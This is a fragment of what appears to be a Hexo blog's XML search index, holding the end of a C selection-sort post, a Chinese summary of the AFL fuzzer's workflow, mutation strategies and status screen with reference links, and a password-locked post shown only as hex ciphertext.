3.算法实现12345678910111213141516171819void swap(int *a,int *b) //交換兩個變數&#123; int temp = *a; *a = *b; *b = temp;&#125;void selection_sort(int arr[], int len) &#123; int i,j; for (i = 0 ; i &lt; len - 1 ; i++) &#123; int min = i; for (j = i + 1; j &lt; len; j++) //走訪未排序的元素 if (arr[j] &lt; arr[min]) //找到目前最小值 min = j; //紀錄最小值 swap(&amp;arr[min], &amp;arr[i]); //做交換 &#125;&#125; 0x02 插入排序 1.`` ``]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL详细总结（持续更新）]]></title>
    <url>%2F2020%2F08%2F25%2F2020.08.24%EF%BC%88145%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 AFL的流程 1.AFL整体框架 main函数先进行初始化和选项处理； 执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap； 通过cull_queue对queue进行精选，减小input的量； 然后进行while(1)循环不断进行fuzz。 每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程： cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored 判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列； fuzz queue_cur对应的input文件； 判断是否结束，并更新queue_cur和current_entry； 当队列中的所有文件都经过变异测试了，则完成一次”cycle done”; 整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍； 2.AFL的fuzz策略 总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下： bitflip，按位翻转，1变为0，0变为1 arithmetic，整数加/减算术运算 interest，把一些特殊内容替换到原文件中 dictionary，把自动生成或用户提供的token替换/插入到原文件中 havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异 splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件 其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。 bitflip变异：拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为： bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始 bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始 bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始 bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转 effector map的生成： 完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转 bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转 arithmetic变异： arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异 arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异 arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异 加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。 interest变异： interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换 interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换 interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换 其中interest value的值在config.h已经设定好 1234567891011&gt; #define INTERESTING_8 \&gt; -128, /* Overflow signed 8-bit when decremented */ \&gt; -1, /* */ \&gt; 0, /* */ \&gt; 1, /* */ \&gt; 16, /* One-off with common buffer size */ \&gt; 32, /* One-off with common buffer size */ \&gt; 64, /* One-off with common buffer size */ \&gt; 100, /* One-off with common buffer size */ \&gt; 127 /* Overflow signed 8-bit when incremented */&gt; 可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异； dictionary变异： user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中 user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中 auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中 tokens： 在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。 havoc变异： 随机选取某个bit进行翻转 随机选取某个byte，将其设置为随机的interesting value 随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个byte，对其减去一个随机数 随机选取某个byte，对其加上一个随机数 随机选取某个word，并随机选取大、小端序，对其减去一个随机数 随机选取某个word，并随机选取大、小端序，对其加上一个随机数 随机选取某个dword，并随机选取大、小端序，对其减去一个随机数 随机选取某个dword，并随机选取大、小端序，对其加上一个随机数 随机选取某个byte，将其设置为随机数 随机删除一段bytes 随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数 随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入 3.Bitmap 0x01 AFL界面介绍 process timing 展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。 overall results 这里包括运行的总周期数、总路径数、崩溃次数、超时次数。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing。 cycle progress 该部分展示了当前cycle的队列中fuzzer的距离、当前工作的测试用例的ID Map coverage 该部分的第一行介绍了碰撞的分支元组，与bitmap成正比；数字的左半部分是当前的输入，右半部分是整个语料库的值。 Stage progress 这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。 0x02 AFL的相关计算 1.覆盖率计算 0x03 源码分析 AFL 相关文章 安装使用 AFL入门 https://www.cnblogs.com/0xHack/p/9414444.html [原创][新手向] 使用AFL来fuzz upx https://bbs.pediy.com/thread-249179.htm [翻译]使用AFL进行fuzz https://bbs.pediy.com/thread-250866.htm AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing https://paper.seebug.org/841/ AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率 https://paper.seebug.org/842/ afl-fuzz技术初探 https://www.cnblogs.com/WangAoBo/p/8280352.html AFL使用指南 http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/ Fuzz Testing with afl-fuzz (American Fuzzy Lop) https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/ 白皮书及文档翻译 使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（一）——使用初体验 https://blog.csdn.net/youkawa/article/details/45696317 使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（二）——详细使用说明（README.txt ） https://blog.csdn.net/youkawa/article/details/76405468 使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（三）——技术白皮书（technical whitepaper） https://blog.csdn.net/youkawa/article/details/76615480 afl技术白皮书笔记(1) https://ljie.space/2018/01/22/afl技术白皮书笔记-1/ afl-fuzz技术白皮书 https://blog.csdn.net/gengzhikui1992/article/details/50844857 技术分析 ★★ 漏洞挖掘技术之 AFL 项目分析 https://bbs.pediy.com/thread-249912.htm [原创]afl-fuzz源码情景分析，详细读码笔记，freemind版本和word版本 https://bbs.pediy.com/thread-218671.htm AFL技术实现分析 https://blog.csdn.net/qq_32464719/article/details/80592902#comments ★★ AFL内部实现细节小记 http://rk700.github.io/2017/12/28/afl-internals/ ★★ AFL文件变异一览 http://rk700.github.io/2018/01/04/afl-mutations/ AFL改进小试 http://rk700.github.io/2018/02/02/afl-enhancement/ ★★ AFL-fuzz工具分析 https://blog.csdn.net/Chen_zju/article/details/80791268 AFL源码分析笔记(一) https://xz.aliyun.com/t/4628 AFL源码分析1——afl-gcc.c源码分析 https://ch4r1l3.github.io/2019/03/05/AFL源码分析1——afl-gcc-c源码分析/ AFL源码分析2——afl-as.c源码分析 https://ch4r1l3.github.io/2019/03/06/AFL源码分析2——afl-as-c源码分析/ AFL源码分析3——afl-as.h源码分析 https://ch4r1l3.github.io/2019/03/08/AFL源码分析3——afl-as-h源码分析/ AFL源码分析4——afl-fuzz.c源码分析1 https://ch4r1l3.github.io/2019/03/09/AFL源码分析4——afl-fuzz-c源码分析1/ AFL源码分析5——afl-fuzz.c源码分析2 https://ch4r1l3.github.io/2019/03/10/AFL源码分析5——afl-fuzz-c源码分析2/ afl fuzzer 源代码阅读 https://www.cnblogs.com/jg01/p/9772700.html AFL不同文件结构 https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/ Fuzzing workflows; a fuzz job from start to finish https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/ AFL 项目 AFL最原始版本,源码地址 https://github.com/google/AFL [翻译]AFL生态圈 (这篇文章有很多关于AFL的开源项目地址和简单介绍） https://bbs.pediy.com/thread-251051.htm AFLplusplus(该工具做了一些集成) https://github.com/vanhauser-thc/AFLplusplus [分享]关于 fuzz 的 一点总结 https://bbs.pediy.com/thread-249986.htm (译)afl-fuzz白皮书]]></content>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网路安全学习库]]></title>
    <url>%2F2020%2F08%2F23%2F2020.08.23%EF%BC%88144%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hey, password is required here. 73296bdc1d9436449b76f537ac3be567a340b89ca9bfd8c10a2ac9e0e7c28fedf782e8c950a335611adb474d46d775f122f5feac37c5b5a3f519b2d6858ceb483d64b523fbb422a366aa88e79cce2e4dca95695aaed84f73b4578a8aa51e1d8133f73fa479b5018b94661fe0ae632e40e7c400fc41fa5d1f49804441214694c77045e82854f5d96b34341b7337bf24de57d4c664efc34ea7fbe966c4bcb14d704a22a127dcce1631fe89f2102f1d5b11910ef1402550ef7f9aee6b83fd9898275487eb19a6d42f3dea75da0d969860bcebbf8e8d7f111a5f8eef993de5f4275f0ad65ba5ccffaea667e9a553ee7108cd7e2d407409cc348184d12c8e18e7ddc16ddb2a426ebf9dd4ed5f875e0bc8f3d96ac7e0077649f7bc9d34f7cb681030db33569ea3720f9aba37fd57daa83f7eafe013bfcae6fe682e0b4d30c877e7839adb22d9c689c48d3b58c18ab3940192b8836ea97a10e1c82872cf4a05a02c69a0b3e6cea372aebd637c4d7cdcdb0864c9a2113f1ea83c4d8ddad0fc35caea3ade0a1642a3af431ed58cf73b18ae904eb6dbb2165162bce71123aa328726fb629b794d9f917b409475e948577a4ce6c9fa63cf61ccf2ef1da1487b2c9ba98b5ca487a2c8eee227b98dd4f98fb5a2d773380ca68513e1842305eb71df0fb28a4cff4514ae1203ac85e112c80965aadffc84242dd4c1b5fa90cd6ea449717b7261e62b8492de8d7fb80b9b1ee7630d721f5f696b6b7a8ca29bc8161db5a59972927fa5836067ea20593b91ddde93ac5a377351fbe41730fce3481566470f551e638469d346a8b9b695ebfdf3f73d23c9e9a8e2044267f2ad1354169ef5f217649bea7319393c9dcda864978b6e2c43a6c9083156a85a70d57087269d51295d5bb9c14a722fdb8b5dc6899efaab2e42bf5f34df605fea8e17749f5ed5636c033aca29f46fc0c290c4f9c191067922ae260740d0880068b155983e8825c8c8e45a313e6e8e1557861bd3cddd6c283d4e0c42293199949739b8b9b438d1dcfc14501a4e98171639e6ee1e6a95f513b79459241f844e503e11108d9a40872f5742e8c91c5d424ce4e10948604392f2b0bb3be03ae7f0b6f782673db61e67d92d654fcce23da013302477a9ce64354906921c6972ef70c5076e7599ecfe9b059945b4df89b9c7486aed5e8b30e6bdf5c2429d0498eb81bc7835170238c9246e6f5341491e1b10f4c1bc008900b12fe7ceb46f3447b21aac8cd204eeb2b28895f54dc0c7c6d177674199293e0e429f9905228368ccfab21a3cde5dd5f90b94d0198573de359d2df5404bdc00d5f9dc8458496702d51b192c56eed9fe43667425d3213cadbf9dccd0c7d06326380ddd916a20e8f06bf351515c7a78127ffc5025a3336b2b51276ef869cdd4c45226af7096ba24124e0eb15bae7fac2cde1948c5063ac4638a82040c57276c1e3f80ec9b61006261b7fa68e7bbd21e1e0f28b716cc832cba230d54f2346feee5001ab155d45066278c29af803c3827b3cc1bedc747164bb35ab9a76463d0bafbad938fa1a05c0740a72a3b52ea583ebd46fe3e028443d63639127ea05565eabb336a557817b8926df4fab102c57f89697f88878de392ccd28ef2772526282e2808573581eb961829abed86d865a8584e5206373e01bdaa33bfc646c6559ffde1af616ba0f927ab45da5af78adaccc8a772ebc3765fc3405803e7c267bb1239b597131443e378b488acf85e906a6e89eda78885d549a670859f6db41f1ef42c937ff64f18d8951c16a3604931f6ffc64efb12970c9ab8c903e5558eea59d9c773da3e4dc651db4d7f347d61d2252a83920902a815d8a23a613c6d0d508b37ab9b673d4a8b78c80e83e70daff93f9f077a18014327946f30a8cd41cc6d4ec2dbcd7bde66c1da71eacb0155693e9865ad0b51a31144febdc793681337c1a2fb4a436cef47a1b02bfc7d7d806c7ac6868f205345da7e60f2086ab491703d41b2f9a9eece07bffcb1d5527768bb270b1e794793b38ab7fb9f14df3187b18042d65b07fb8b507d3171d9d00aceee7486eaee985c57f53d0a03418a9aa159219bb360ae021203887729e849934460dc1cbbd1581c88ee408452ebb710b8d92a23d08fbcb8e52a4bbb402a6dedaa301fa27286990b7e43bbb368cd9eba3b2d5a56d28e32d822ba369a6c1e85b0da93905c336a9c27445ac8b25d8dfa6a2e39210e7ba38aa851f4d1f07570890ccf7c642e6b9aed3dc9d5b6e35f4e5afa92549c1004a82415824b0f13ae4deef4dd3e734f352ae7d484217235c0e25052a18c07080c21f7a5a051e5a693eadafb944c7730bf17c85357f4f1b681d504b72206a40eb2c60900d5b01dc3a5e9be06f0ff8c26e406d35cef6e88cc11892084a3310ea92051de1b05df2bad491e368d84ee9d3cef97fd16a72cdc60f0531854d8543e0005259ccee88e07f5ece78e6995a9e442c76f0497e70eb5edfe9be186efdb7ee8f9a3b9c8a75fc11f58771a3bf3adb4b4b233ca9fc560c4e73a0a9be01d67de0f5b8d98f7e8c196f695d09f0d553e58cb7be598eda4e9caa3abc6e2a8b718ce6973e2b58d41bcd075330e40e3d7a254a386aaed3fba82f3100e12c7e78c451acc4897d6359db8ea1a5e8c914c79936e1e8630f9e99d35cecd44b747ea436c1ddd58c822717faa3ba056cda0decd53433579e570ce1d3eba29e5bd6526aa6eacdd3532261737f2aff47beb28dc90ad557a1d887ee67d41144d275de4d7eca350cf09a4518059249dc8037950e5c350f25a44007dfd71446362014797b18b5710ec439689e087577751ab919138d0b9d13368fae417458aeaa077224fa1cd49396d4fe8f36bc445e362befc2cadca5d25b389700c481f8e87dca18ae7f7816b50fa83bc2406d6d194ba12d12b8443d746a9dbde1e808a891ae4219f32753f9a37592d01bd3164c64f2bba9d74351fa5a97b0da589746a817df96ab0818e0c665564882476d6d26d753c7f7ebb6240401e317afb6812327c7ed2ecf9079b682eabbd24af75128a46b2f0be0f4f058589a21bad98525fcf980f16e27159d18bfe0a29ad5639cf90f827a4faaa8422fc764669d59a49e22865145f3978bd34567a53510f08493a12017636f6563584b9ca933a760e30f120e2bcbe5a0f27dfae0d6461b39cf28ef6ae323c1ce9b873d5ead372ff5f05dd793016380f9bcc22fb7e4aa4bf8dc3b268e5813ca2d00c4f2517a00945a0704200eef06d00931535b47ffdfe3c4d9116c3dc87ecf1a9f5c6dadf80d7253d309cd470b274b32acc519421a191ba5d6c551fd377610345fd3cb3c5466edb7e2475ca9482ff7f15fc875435c6ec23d362e424035647225e68cf6e97eee1fb84fda48ac58116448a6fd14ec0c757c1ebbe5b931927335146044faead73a591a3a07e3534f7b37179f49430609d1b147b10b5a3d0eb4d9a4b4038e2e5c50e058e4f40e8dc80c41ebe51d42a4aa87ba2dc9489279ce24d563b55e12518782fc3c551e8323d2b8fb8c7fe5e11c528c5182bb725c18f2b3799a0c93489150085bf5f7b02f3a71995282c2fab27d73708628f2c69340632e47bd9e7de7db386b9d135328096db600396344701d4dc295ecdcd27925f29e81e70bfcea40d450a360371d1aaa7f40c82d66539e101cb85bcdfb95a757ed2ce333b001f3f1c48795253d8446dc1fea60c6bd350f87096ef27ea76dc11f2a40567b7ba2d8733a570aa5c67e4530bd2b870ed85c61c96dbeefd35afcbebb5a451af74ab7490b093b1221d9f0fe86c241507f10d88ffe6d5bf96516c39cbd2c30b3cf8e9e518d20df8d8c7669375c25a6aa811190b7acaee1a7ec0bf0bc25396f4cfeeb85c40d2def6b9b9b2079182461a25f605d91507e919ed60f18efa9f34e07f0347291c0d132e5f1c61ed540171f1c91c47bf70ea29e618855ae7ad37ca481b132bd859109215adb1ecd546959aa47a6bce757021751b8f03fc81d662aa8e021f7b3c64d05c92303f4be64a95b4dfada0a0273b25ee194d1c8461afde28fc86615724b1a9dae0dbb8801f23808ebec5a6c3021ac9a626387b37779d160feda9ed8d48bea08696c91bcd8dbdbad19a7e1c3389f505bcb3f3ca0be013e368b4dad9c330940d33265177fa1bac3ed37851d4d34f76e90ef59c1db0741e2af6ec3222594b437793775da24121f3448e1e900debc51b04122dcc549b220ec1b0f922bfbbf361ca7e8f7660f909cb0804f85cedf4aa957d37295803bfe22f3658af8c98a80e235e13bdba3ac39e99c056454588d2e9ee7d281c89187d28a2ef0457ff5e4c0778cb28dbe18ce4478a6b0e8d4a6c6520bd837e0935ab957e9f20f3b5cb52b1d08f1cbab68e653d0073476ba63c6a4f7b1bcee26237d62397e6790ed53be5c4597a55a75d9903d6ad91f4ef3e5ab493dc21f17f19f12b98ae9952808197c820dc1c383c664b72bbf73eb3f0add3ff058b174d4b8a71c5bb53e92145d7e5a63672e824348cb383d437c26da074597c26b65bdaa738e50abcccfe7ea4c801d7f1e20852bfd8871b72465605fcc69de40d15e4f9d7f06445a77f922697262e2a9ff493278d611d703fa95acb05053896bb92e76c715a1a28bcda51d46ac2138066a9c6537f106d003732fa516b4979c5acb624f8bc6446b2c47e35eda9af8624154a6a72aa7bd0abc258e0987b3db36830599825cbaa64e708ff6adab44bcd76d1536b9b4c5d97ccc295e6ae4af75094d4e6d5f201963d03523cb3a3f4d51c989cbbfa746bc430ffe506fdf0b32d5682e6742a0ba1d3898128b47e82754385359f5a8ddf1001f71c0e8460248fe61ec58b16d20e3b5e1ab6c603543c5296c5fa39deab2abf58e697707f7d99c602d4eba0cd721b0846a3465d6e93afde5fa180f3af3da4634844ccaaad2b97ac35b5a7c10ac711de1921f7d0f13f8d79fc76c6ea7eff8a98eae5118b3f89af556cba8c685b2e974789710cdf38c4ccfbfdc0007aed69b155d659775276dc689c058a4cd166c959d68c97338aa821ca2e2466c0430bf93b82b686aa8007e53096f914a56525b1e2ea85d3a61efdf7571c8a7faa9283448ba7921ed220f9f12fb6adbc9d45c3fe54f74a80de2931794e1b35e63445f3a620c35fa93226b15e6137c009b55d3cc0ff9e8af56ef671625627cf0e4a83f45c507a8142a858dec4911aeeee259afee4ccf987bf5faba6531862645027d6051c32f2391611bdd7e224f4ad4d2610d19b11b66904f159fdd23ca8a5a6f1428a942f3d494a877d7cf7d0cf223eae69585f63c3760a46b45d380bdd0a6737834f16aeedbd494bd718ffd92deceb83680570f0ec89f91b49e58e2293d5e40706b12fcc09cad5a8866817644beee03f27f42e30b787f9ca15491e2c825ed470ba310904d779d183bdb4def357d7116be405483546ebff451f8a0bf9202ec1c0146e8e986341bf1501358ada2d1ecd0635f72fd3a7467944039041be1a03af349acb0408357e940ce1d1334e747dfa844af06ca5e53c2bfe5634fd4965210a992dd57583a3b538e84683591b93f83ebe0c52a41da0dba66538a4e95fcfdfbb00e466a45a54d38e7e258a24330ed1b435cd9a79ad5cff7e015856be7cc7df0b4dbcc8d662fa4e2785ac9ebd8da170c98f8ac0e91688490c64b0a6002c59441cc626d4db8b1db745e6e248cbf535a3a4afc9cb9ecc181b374692613dcf1eeb2cf3efb7561125d6e15a80d2f0a7b7aca17430971aa23d1fada708e0740ae463f15c35e794a35366dfd49c78379a4c9ee5a718dc8a030e480c7979929ff5641041ddcf948e909ffdfc28839aa1fdb2c3f4beedd4f2c9152bd67cc439d7fee10198edc7d9976a01760334cdcb83fb0c249e05fff0f8a687c660e70f3b33b570626287886b3f5f2bad2fe161461af55a9ad8e6c521dc4fb020d242f63567ff93ed7f73500e76d0bed89caf021444ea086c0e903d7e431b3317bb6662f091673940e6ff9006d4d7f5f62872e9597e2cedd94832b2580ca6c4ef5d05c71ced218cffb78b4768b97f63f490cc7b0624bb9cf4170ea3230874dffdbe25be44065e10d896a3f2b6be29971e0fd9a4eb4ee6a1575b267bb23f96599893194b3ef84770b8f9d2f3f7a10976ec27fd18cb4988ab2b619056217dceb6392dd3e55363ada8e32e3bfd233584d33e7ae55f7bdae964efb3e4e8364b0526f9946de92b80532ee44b5661d01a0073f3caf11ec73f87eb298d438ce633e333b362fb2b4783d5a211dd326985260fbddaf7bb46d8bc53aebbbd9a37adb33c3ecfa4247fb3e33d048094a228a6ecfb9467a82a57b92f2da2b1a1d1bbb9a84fbeab1d5f4267d9a0862c632d4939dcc3a4a766726b074d4e18d237f7044644b5c7ed5d4d60be58d6f82ee1cac27f431757ba2d3d64f46129a8c65cffef618858af9f8f64c3a1469d7e6a72cece357d6344084c00440cd7f50deb32ca8e50f3d69194dec810bdc81404fc32a500b4eff6098283f6781258423fc1edf393d0ba4f24c1336a7ac72993865871aab1a7380edd169de396486f5a5dbe3b2313e034b90916eb1dd90dfa1365edc06cbda61b3f183f8193a56dffe46e168e24591c89acf15ae5d5a54a66b4fb967949bf2efa83544e163e16317bd8d282ec360365f74a92c7a362c9d5c7e6d55373884c35eeac1e77d538e3917a1eb4004ff649136bb8a95a2af64d5fc4e70ba3665ff8f05f78d1d0e5d0d2c84fad81cf1cf4fc19cd93ffb4726c67d5355af6cb43cfffef6cbfaccffbcbd2121eeab933d3df03f95770c731d7c0ac07aa65c3bbc550731a8dc29fb0b2a525c4fe9ffc43d26db4bd730728c52091abdc73eee897f09be67e00676bf4d05b385462dee976be0930673711c47ec202a18897eba611804793189e43159bb4d332834f6f2c252137d919367fad6ba7cc803f0ca9b2fd1eb707f6323dcd28fdc3ab4e3fef79086d6d2b62bf29003fb11f0bd9918fdbb3ca410c2d1e6e5d5a2d54dadfad1c461e836471783ba33891d486def7da64ec42874db44b9f3b415b4ff03769ad609c57002b842fd535850d030f3881b56957f52f02c2d07a25f2b634bc057681b809e4b8695fd0ba9cae8c5d569f435a7a5d848e7db87f2b20c68ce0685ab5836260c9da17cb86796b489156cc0e3e0cc5cd5b10340d2aec50f0ac9d4be94da5f6531993556cd054a9b32d6a9017bee77660fe2ad3ad5391b4e0c49fa6b1bbeb05f50350ebd409f5c7d12c82ad15b96e923194723cfe927743d2e544f5b77fcca51118b773b335f097b6df210f216de702c074a39f468e800d4faadd1fa3b4a4a5bce0e2a9957f893b2efb3a64985ca78cec91d47a7000585570c48037f94414c8234109aa94d3e125ea381e05e03872eea5e11faf872bd5ef4c4935bc724fb38773682eac4ce80a9b1e073ef316d249c22b5a9db54cb8c7ae1bfc9740d3214a1407cdc79dec220565f180ae14a4e9a0568b0718b318c392b6e7c27db97f8b79b82895467cc8fe6c84ad589b51e7fa70d928e105566f0b2f5837ce60387ee41a53a7507852abace609f24b244bda0a33b3ff74c96263bd9d3c01f121b4ebce95adb21ceda881f2ea1480b8f3f6afd2b0470dbf614f7469e40a3dea93b6de9cf69400acabc5506a0e04c5e16eea774bff9ecde6b1bd14e177609b8ec83f72432bc478e746c5500aba92edfbde7d2ef307877fa6c7c430ea79df6eb45618b65c7508cb4bae7db57f459b651d785f276ddcfba4ce4a924d5c4dcf7e6c1b162c3209bf5ba070f242d1e807ea26ea6e8d8e29696efe9700a7d1af8a838f4c0c3907242c99e9ffe1bf5ec1c95bf43dad69d19d7ea546ad0950918544f7b7444618c65e1aa7b65efa5471dc990bc6f788630981092741169ec8c75ff0d4fb01acc25f04499099295beb2f0c09de8aa0a8cecc2c9782df60af1ea1c2ff9166415ec5d9c614057e2a66414cd8b301043d39221227dd2b96fe3a6c2b9a747043c764ef6cac19a8e0c71ff7e0ca0500dce6b9bf00129f52c4c8f923687375958e7e21630cf09cf21f68f2b88690997eac7ee7df731e95b4022b3ea9153bc9a9c7682e99e03e277f602fab15898b0eb00d90fe41da509037511bf075f5adeff4ecf8f4ec6258b1f9976e744755db2ab90d7976915d8771a97b51d1413c467311e8addcc9cb7a87d0cb27bfd20484df8e4adca099d62bc26bffad7f0879a722f047f580f8c6d3b933b7c78b3286ea505416de7a423465b5b6307a94c845bfc502f5a8f7c417d4c5a3889f4d9b63c94ab9925c8e50ceff17913c02c66345a91e9252bd81c3dd0b6deeca2fdc17a69c02a97dc5869a28af549c39ec71dcb10faad619f48f9b4b5e8498a5948fab7e4d5fa26a4735e963300549d903eb6ec26425239deee99c3c4915456d790a361514de2dac2c58929e3b586e733ae10c7bdd499393d003796861e73a356c1ff8ed8487ec57d5240d5d5811bf53181479c2cb84db5296a72e8a51f554a06803e9705c945da4dd5174be9b463c459b33eaf1dd10b5056677ea5764ce3aa55e5bb9f351c977d29a5789dac9197df358709e062885af7d10df0d2122d2665ef2308430aabbed8f8489de5f77399cb86bc81362212a7adb473762255672d6b253f48ca3a78d052b03c15a0720043d0b3627eb9d096310c3a404b5a17edc8beeef6a80a67f827656078b0a301a5a90038f3e934fb835953999776248729ea05814c02fe70fde9bfa71806a3f214fbd62ff076a9f1bc1eb7dfc25ea364c381be336a849b36488c9111c081b9e7c1c9c0cae7ba6ac50a3c777df9153e962df74a08e5b56f175da834bf992f1da14c5443c41a913bb9dfe3f5df9c0cabcd4b1f51b05f34a89bc6956bcaeab222f61368e145a33d246c60b86730071eab8c76718e91897b9c253568b706bf9d4bf1216121d994c84e071777d2f5c4363cdebfe093f86f4def0b763549e2126bcdba2b3d0c6a0af437ace0e8180315ec51dbbdff853e39bfa3ec4d1971ecad505950cbefb1cbf7c67d49e1715594f76eb6ea990e36564aac52e01a78a07ae8ed6ae5198fa80660b63ce747fa126a4ae00f8b3515ff7a63ae822221815e3c2da8e480657da644875feadb4e55c278768fe2576db33f9dd7b93c97d41c55fd9a4f54e24efa1805da672eed842a106c7535014f53e6348c7bd744d8149f9f7cd57d4a9c27e164f2fc8b74cd927e37455338af5e524f7260fca1d79e00e7ccffffb670fcd1de021ec4be4ac703eb95f0a62892a1fe9cd4f8cb7f3b09423ef20729b76ae060e4f45b798912fb4383806f8e3ac47197c02aa1a86adde3940b9fa949027b48ba79da73638652f616ce4cb440118331c6a9be886dd947b829d0bacfc39ff04c1271c6b96cacb453aabf16022edf80ecad3eeabf1ec5f81fc12738f43625e37ad19f327d9b85d6ecb0470e3d5013dd5f4f84e78d3ae8b1fd1da77ac3adf0da4d3c10fc55395732e1e429800abdb651ff65ea093ca7c40368d6e19e846fcf20fbba531b7dbfb954a50feb195108fec59e01afd3840aa48051547ac07506008682002adbcca1ef97e8bd5473dc4a3585e313ee2e380f9c2e975bd19f10be724838985cebf03230e1e31a37c8535e7cc724a699620da29e82591a154e8eab743bc8eb5b35c17efedf3b6164ca7b631779e0ef1d9b1a0f8145f4e6d8b2be743806b279d944dc129fdf676081d8ffcbb36d459e071cf1ba49032b935aff3710f52bf0248bd87e377c2647df98da0affb17fb53c7cc8c1e6969fc28a01c693dba0035038df2466b3524496c6da1740132094056ef776bc5ce572944fa53767e7debd52f12704d2e75dd3ff799c6605005a6cdad6febaa90972c039093b8b03613e6da934e19a8d720ef1ebedd3602e5b6ab7b5e61b0b8dcdf4245a46dea0c3de445ad52151c54fdd29a4390431968a37f353d7aeb793a833b5fc6cbeb4007ed3f8f27a6add86ea9c6dcd160b4cf53bc6f53e2694c1d8114a1eed372abb0dd157e324efcf902b91f6f367159ce173035217193225068c78e51f217260eb9510f84154486780d3ee38305a2607198d4095b3756a40313c6ef0823a76cffbb259c66408dca3bf11c6f5e52cbfb46673993dd96c27b